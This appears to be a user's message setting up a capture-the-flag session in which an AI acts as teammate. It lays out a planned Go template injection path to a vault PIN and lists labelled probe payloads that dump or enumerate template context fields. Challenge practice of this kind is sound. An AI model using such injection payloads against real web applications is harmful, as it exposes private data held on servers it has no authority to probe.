
The likely intended path is:

    Filter
      ↓
    Go template injection
      ↓
    session context
      ↓
    .Vault
      ↓
    bypass "vault(sealed)"
      ↓
    staff onboarding note
      ↓
    PIN
      ↓
    tribectf{PIN}

NEXT TESTS:

I am going to test these manually in the portal.

B1:
    {{.Vault.Pin}}

B2:
    {{.Vault.PIN}}

B3:
    {{.Vault.Note}}

B4:
    {{.Vault.Badge}}

B5:
    {{.Vault.Contents}}

C1 — VERY IMPORTANT:
    {{printf "%#v" .Vault}}

C2:
    {{printf "%+v" .Vault}}

D1:
    {{range $k, $v := .}}{{$k}}: {{$v}}{{end}}

Other possible Vault fields:

    {{.Vault.Sealed}}
    {{.Vault.IsSealed}}
    {{.Vault.Key}}
    {{.Vault.Unlock}}
    {{.Vault.Reveal}}

Possible context fields if Vault doesn't work:

    {{.Staff}}
    {{.Admin}}
    {{.IsAdmin}}
    {{.Permissions}}
    {{.Access}}
    {{.Clearance}}
    {{.Note}}
    {{.StaffNote}}
    {{.OnboardingNote}}
    {{.Postings}}

Possible posting enumeration:

    {{range .Postings}}{{.}}{{end}}

or:

    {{range .Postings}}{{.Title}} - {{.Body}}{{end}}

DO NOT:
- brute-force the PIN
- brute-force thousands of template fields
- attack the SSH host
- use the portal as a proxy
- try to attack the loopback service mentioned in the SRE posting
- waste time trying to mutate `.Role` into `staff`

The goal is to read information already exposed through the template context.

HOW I WANT YOU TO HELP:

Act as my CTF teammate.

I will report results using labels such as:

    B1 -> [exact output]
    C1 -> [exact output]

When I give you a result:
1. Analyze exactly what it tells us.
2. Tell me the SINGLE best next test to run.
3. Give me the exact text to copy/paste into the portal.
4. Label it with the next letter/number.
5. Don't give me 30 possibilities unless we actually need them.
6. Keep track of the discoveries I report.
7. If an output contains an error, pay close attention to Go type names and field names in the error.
8. If we find the PIN, give me the exact final flag.

STARTING POINT:

I will run:

B1:
    {{.Vault.Pin}}

and:

C1:
    {{printf "%#v" .Vault}}

I will then send you the results.
